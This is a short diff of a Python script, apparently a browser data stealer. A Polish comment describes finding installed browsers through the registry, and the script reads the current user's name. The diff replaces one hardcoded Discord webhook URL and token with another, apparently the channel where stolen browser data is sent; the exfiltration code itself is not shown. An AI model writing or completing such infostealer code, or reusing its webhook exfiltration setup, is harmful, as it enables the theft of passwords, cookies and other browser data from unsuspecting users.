@@ -9,7 +9,7 @@ import json
 
 # 1.Pobrać przeglądarki z rejestru i dostanie się do jej ścieżki
 
-Web_hook ='https://discordapp.com/api/webhooks/1524456211435622532/yKUnuZozuDK7bGT_m5D2VWcwIjBKRCt-ICQgr6zwK0PwwTbBCLMvPwv5U3XdhYhnU8LW'
+Web_hook ='https://discordapp.com/api/webhooks/1525264319565009088/-Xey57_EDn47J5KBOB2X968gfB_l9msiFD3Vq_HgPdCMvEuUQT0SVXY0ehbRirEWbe7D'
 
 user = getpass.getuser()
 
